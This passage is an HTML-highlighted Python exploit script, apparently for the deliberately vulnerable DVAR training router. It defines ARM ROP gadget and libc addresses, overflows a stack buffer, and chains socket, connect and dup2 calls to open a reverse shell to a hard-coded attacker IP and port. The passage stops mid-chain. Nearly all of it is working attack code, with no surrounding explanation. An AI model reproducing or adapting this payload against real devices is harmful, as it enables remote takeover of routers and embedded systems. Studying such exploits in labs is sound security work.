+</span></span><span style="display:flex;"><span>execve_stub_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xb45c</span>
+</span></span><span style="display:flex;"><span>syscall_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x00032b3c</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>stack_buf_start <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xbeffb66c</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#stack_buf_start = 0xfffeac8c</span>
+</span></span><span style="display:flex;"><span>stack_buf_data_off <span style="color:#f92672">=</span> <span style="color:#ae81ff">368</span>
+</span></span><span style="display:flex;"><span>stack_buf_data_start <span style="color:#f92672">=</span> stack_buf_start <span style="color:#f92672">+</span> stack_buf_data_off
+</span></span><span style="display:flex;"><span>stack_sin_ea <span style="color:#f92672">=</span> stack_buf_data_start <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>   <span style="color:#75715e"># 0xfffeae20</span>
+</span></span><span style="display:flex;"><span>stack_dummy_ea <span style="color:#f92672">=</span> stack_buf_data_start 
+</span></span><span style="display:flex;"><span>stack_csock_ea <span style="color:#f92672">=</span> stack_buf_data_start <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#39;192.168.100.2&#39;</span>, <span style="color:#ae81ff">80</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parse_host</span>(host):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        ip, port <span style="color:#f92672">=</span> host<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;:&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> argparse<span style="color:#f92672">.</span>ArgumentTypeError(<span style="color:#e6db74">&#34;host must be in format &lt;ip&gt;:&lt;port&gt;&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (ip, int(port))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check_null_bytes</span>(data):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">in</span> data:
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">from</span> termcolor <span style="color:#f92672">import</span> colored
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;payload contains null bytes&#34;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[payload]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ff&#39;</span> <span style="color:#f92672">+</span> data<span style="color:#f92672">.</span>hex()
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># chunk by byte (2 characters) and iterate</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(payload), <span style="color:#ae81ff">2</span>):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> i <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">and</span> (i <span style="color:#f92672">%</span> (<span style="color:#ae81ff">4</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>                print()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> payload[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;00&#39;</span>:
+</span></span><span style="display:flex;"><span>                print(colored(payload[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#39;red&#39;</span>), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                print(payload[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>], end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>        print()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_send_delayed_routine</span>(p, data, delay<span style="color:#f92672">=</span><span style="color:#ae81ff">1.0</span>):
+</span></span><span style="display:flex;"><span>    time<span style="color:#f92672">.</span>sleep(delay)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Sending </span><span style="color:#e6db74">{</span>len(data)<span style="color:#e6db74">}</span><span style="color:#e6db74"> bytes&#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>send(data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_delayed</span>(p, data, delay<span style="color:#f92672">=</span><span style="color:#ae81ff">1.0</span>):
+</span></span><span style="display:flex;"><span>    thread <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>_send_delayed_routine, args<span style="color:#f92672">=</span>(p,data, delay,))
+</span></span><span style="display:flex;"><span>    thread<span style="color:#f92672">.</span>start()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> thread
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser(description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Exploit for DVAR&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    subparsers <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>add_subparsers(dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;command&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    miniweb_parser <span style="color:#f92672">=</span> subparsers<span style="color:#f92672">.</span>add_parser(<span style="color:#e6db74">&#34;miniweb&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Run miniweb&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-H&#34;</span>, <span style="color:#e6db74">&#34;--host&#34;</span>, type<span style="color:#f92672">=</span>parse_host, default<span style="color:#f92672">=</span>HOST, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Target host (format = &lt;ip&gt;:&lt;port&gt;)&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-l&#34;</span>, <span style="color:#e6db74">&#34;--listen&#34;</span>, type<span style="color:#f92672">=</span>int, default<span style="color:#f92672">=</span><span style="color:#ae81ff">1337</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Port to listen on for reverse shell connection&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> remote(args<span style="color:#f92672">.</span>host[<span style="color:#ae81ff">0</span>], args<span style="color:#f92672">.</span>host[<span style="color:#ae81ff">1</span>])
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;miniweb&#34;</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        variables <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;g_pop_r4&#34;</span>: g_pop_r4_ea,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;g_mov_r0_r4&#34;</span>: g_mov_r0_r4_ea,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;g_ldr_r0_r4&#34;</span>: g_ldr_r0_r4_ea,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;g_mov_r0_0&#34;</span>: g_mov_r0_0_ea,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;g_pop_r1&#34;</span>: g_pop_r1_ea,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;g_add_r0_2&#34;</span>: g_add_r0_2_ea,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;g_add_r1_1&#34;</span>: g_add_r1_1_ea,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;g_add_r1_1_with_cmp&#34;</span>: g_add_r1_1_with_cmp_ea,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;g_mov_r1_0&#34;</span>: g_mov_r1_0_ea,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;g_add_r1_1_with_r0_cmp&#34;</span>: g_add_r1_1_with_r0_cmp_ea,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;g_mov_r2_0&#34;</span>: g_mov_r2_0_ea,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;g_str_r0_r4&#34;</span>: g_str_r0_r4_ea,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;g_pop_r1_r2_r3&#34;</span>: g_pop_r1_r2_r3_ea,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;g_pop_r3&#34;</span>: g_pop_r3_ea,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;g_add_r2_1&#34;</span>: g_add_r2_1_ea,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;g_strb_r0_r4&#34;</span>: g_strb_r0_r4_ea
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[gadgets]&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> name, virt_addr <span style="color:#f92672">in</span> variables<span style="color:#f92672">.</span>items():
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>name<span style="color:#e6db74">}</span><span style="color:#e6db74"> = </span><span style="color:#e6db74">{</span>hex(virt_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74"> (</span><span style="color:#e6db74">{</span>hex(virt_addr <span style="color:#f92672">-</span> base_address)<span style="color:#e6db74">}</span><span style="color:#e6db74">)&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[variables]&#39;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;@dummy = &#39;</span>, hex(stack_dummy_ea))
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;@csock = &#39;</span>, hex(stack_csock_ea))
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;@sin =   &#39;</span>, hex(stack_sin_ea))
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[funcs]&#39;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;@system = &#39;</span>, hex(system_ea))
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;@binsh =  &#39;</span>, hex(binsh_ea))
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;@dup2 =   &#39;</span>, hex(dup2_ea))
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;@socket = &#39;</span>, hex(socket_ea))
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;@connect =&#39;</span>, hex(connect_ea))
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;@exit =   &#39;</span>, hex(exit_ea))
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;@execve = &#39;</span>, hex(execve_stub_ea))
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        sin_family <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xff02</span> 
+</span></span><span style="display:flex;"><span>        sin_port <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>htons(args<span style="color:#f92672">.</span>listen) 
+</span></span><span style="display:flex;"><span>        sin_addr <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>inet_aton(<span style="color:#e6db74">&#34;192.168.1.156&#34;</span>)
+</span></span><span style="display:flex;"><span>        sin_zero <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x01</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        sin <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;HH&#39;</span>, sin_family, sin_port) <span style="color:#f92672">+</span> sin_addr <span style="color:#f92672">+</span> sin_zero
+</span></span><span style="display:flex;"><span>        print(sin)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        local_off <span style="color:#f92672">=</span> <span style="color:#ae81ff">299</span> 
+</span></span><span style="display:flex;"><span>        remote_off <span style="color:#f92672">=</span> <span style="color:#ae81ff">172</span>
+</span></span><span style="display:flex;"><span>        data_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">48</span>
+</span></span><span style="display:flex;"><span>        offset <span style="color:#f92672">=</span> remote_off <span style="color:#f92672">-</span> (data_size)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> offset <span style="color:#75715e"># 173</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># data area</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;x&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x10</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> sin
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;x&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># reached @ret</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_mov_r1_0_ea) <span style="color:#75715e"># also set r0 to 0</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;B&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r5</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r6</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_add_r1_1_with_r0_cmp_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_add_r0_2_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r5</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_pop_r3_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(stack_dummy_ea) <span style="color:#75715e"># r3</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_mov_r2_0_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(socket_ea) <span style="color:#75715e"># csock = socket(AF_INET = 2, SOCK_STREAM = 1, 0)</span>
+</span></span><span style="display:flex;"><span>                                  <span style="color:#75715e"># (will pop {r7, pc})</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r7</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_pop_r4_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(stack_csock_ea) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_str_r0_r4_ea)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># fix struct sockaddr_in</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_mov_r0_0_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(stack_sin_ea<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_strb_r0_r4_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(stack_sin_ea<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_str_r0_r4_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(stack_sin_ea<span style="color:#f92672">+</span><span style="color:#ae81ff">12</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_str_r0_r4_ea)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># prepare args in regs</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(stack_csock_ea) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_pop_r1_r2_r3_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(stack_sin_ea<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#75715e"># r1</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xffffffff</span>) <span style="color:#75715e"># r2</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(stack_dummy_ea) <span style="color:#75715e"># r3</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_mov_r0_0_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r7</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_add_r1_1_with_r0_cmp_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(stack_dummy_ea) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_mov_r0_r4_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_add_r2_1_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">+=</span> p32(g_add_r2_1_ea)
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">+=</span> p32(stack_csock_ea) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_ldr_r0_r4_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r5</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r6</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(connect_ea) <span style="color:#75715e"># connect(csock, sin, 16) </span>
+</span></span><span style="display:flex;"><span>                                   <span style="color:#75715e"># (will pop {r3-r7, pc})</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r3</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r5</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r6</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r7 (addr to patch = ) </span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_mov_r1_0_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(stack_csock_ea) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r5</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r6</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_ldr_r0_r4_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r5</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r6</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(dup2_ea) <span style="color:#75715e"># dup2(csock, 0) (will pop {r7, pc})</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r2</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_mov_r1_0_ea) <span style="color:#75715e"># also set r0 to 0</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r5</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r6</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_add_r1_1_with_r0_cmp_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(stack_csock_ea) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_ldr_r0_r4_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r5</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r6</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(dup2_ea) <span style="color:#75715e"># dup2(csock, 1) </span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r7</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_mov_r1_0_ea) <span style="color:#75715e"># also set r0 to 0</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r5</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r6</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_add_r1_1_with_r0_cmp_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_add_r1_1_with_r0_cmp_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(stack_csock_ea) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_ldr_r0_r4_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r5</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r6</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(dup2_ea) <span style="color:#75715e"># dup2(csock, 2)</span>
